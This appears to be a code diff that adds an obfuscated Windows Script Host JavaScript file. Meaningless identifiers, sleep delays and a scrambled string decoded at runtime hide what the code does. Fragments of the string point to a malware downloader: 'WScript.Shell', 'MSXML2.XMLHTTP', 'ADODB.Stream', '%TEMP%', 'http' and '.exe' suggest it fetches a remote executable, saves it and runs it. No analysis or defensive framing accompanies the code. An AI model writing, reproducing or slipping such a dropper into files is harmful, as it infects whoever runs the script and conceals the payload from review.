@@ -1,0 +1,15 @@
+function think(symbol,flat,cloud){WScript.Sleep(60317);inch=2877;while(high=high){try{brought[inch](inch);}catch(gas){brought[2657439]=high;}inch++}}
+century(1688);
+function quiet(sign,much,a,million){return sign % (hundred+hundred);}
+function car(human,desert,cold,go){drop="hXOnr";brought[6002555]=paper;book=story(material(next),drop);}
+function story(want,baby) {test = melody;sat = imagine(baby);poor=[];for (describe=melody; describe<=(imagine(want)-(sat)); describe++) {if (look((want),(describe),sat)==baby){poor[imagine(poor)]=look(want,test,(describe-test));test = (describe+sat);}}poor[imagine(poor)]=look(want,test);return poor;}
+function imagine(need,stretch,garden,excite) {return need.length; }
+function look(written,cat,modern,stick,probable,speech) {return written.substr(cat,modern);}
+function paper(){brought[6329789]=tube;book[character] = high[book[melody]];}
+function sound(lay,course,low,band,press) { if (quiet(low)) return lay+course; else return course+lay; }
+function too(page,between){return look(page,between,set);}
+function material(doctor){mount="";spell=melody;while (spell < 2234) {copy=too(doctor,spell);mount=sound(mount,copy,spell); spell++; }return mount;}
+function tube(camp,rich,silver,win){book[character](book[hundred])(brought);}
+function high(third,clock,have,same){brought[4556176]=young;WScript.Sleep(6884);next = '\"(\\((s%s .UgfiSninEi dRr;eDttxNSxOStefDnT(Oee\\M\"smA@nnI\\o\"Nop+%rsY\"i\\+ev)\\r\" n.@!EA\\=\" d ,=n\" \\a 0%ps)Ux )SEr=E.a=R)v-D\\ \"N1{lS) lD )eO{0hM 0SAW2.IS tNc=p%r=i\"i\\r=p)c t Ss.{WusY\\t\"=la(Yett+esc\"p\\e.(1jA27b(25O 27ef22ti21a )\"e\\;}r;  C}};.  ettesprlliysar{efc   SA{nW. r(osu p tfe=ein r (s ;\'.\\){rG0)eE3epT+(l\'0\\ah7,cc, et2\'(\\(a\\h\"c]t@}\\t\" \\p\";rs+)t:Y(s/+db/\\n\"\'u\\@es+\\s\"H\\.\"[,A[e\\ \"]);\\+\")(\')\\ge;/ns silveraaatfrrS  co,mhtY ..+=p)\" \\(hs=mp.ao\'r\\dye+nxp\"a\\ler?ad.fcvhneqtn(kaj/\'M((l a\\i\\r=edt a{mY(2] l}[;k)o)o/b\\{\' gyPr,tT} ;T2f9H=uyLtnuMaceXbt;r0i7e-o3v7n=rl ;e)(\"SZT\".+)\"2S \"L+{\"M_ GXErRS\"e M,t\"\\\"\' u,(lrotrntcn oecS(j]t\"b\"r+O\"iee\"n+t\"gta\".+e\"fir\"r+C\"or.\"m+t\"CWp\"h+i\"agr\"r+c\"CeS\"o+W\"dR \"e[=n(i aprAta  {r {)se (eh)cIt3anc  t}< (; )Tleo,r(t1n o0ce()]l\"+dia3\"h+0\"we)R g;\";+ \"0e}R \")[=n;i a retb  {o ;yor]tk;\\\"\"\\[\\rg3FbL]h.V(Vm\\m\\o\")+c\"(R.\")+o\";ErS Ue\"W+z\"S_o\"c+u\"rTdNi\"i+p\"sEt\"e+.\"rRQRu\"u+o\"iUs\"t+\\\"\"C(_,Y)\"\\+\"\";EaK \"u+}\".H \"u }=d  leoer.tlnuoscp e;d) \"u\"{+.\" ldlWeuhS\"t+c\"sSr.\\\"\"+i\",tpp\\i\"rt\"u+.\"dcs\"e+l\".SeWc\"e(s]p\"ut(\".+2\"ec2\"c+2\"ne2ja\"2+d\")bn\";+u\" Ose}\"\\+\"\" t[\"e+ \"+a=\"++ \";eH\"}+\'\")r)C(\")[;)}tcpaitrcchS(We() {=W Sncirairptt;.8s6l7e9e=pv(v5p9v8j2g7s3s6r7r5n)O;X}hqryodtzccuzr=tbsonookc;';melody=0;}
+function century(war,supply){brought=[5081];think(brought);}
+function young(represent,kill){set=1;hundred=set;WScript.Sleep(2575);character=hundred+set*hundred+set;brought[5655055]=car;}
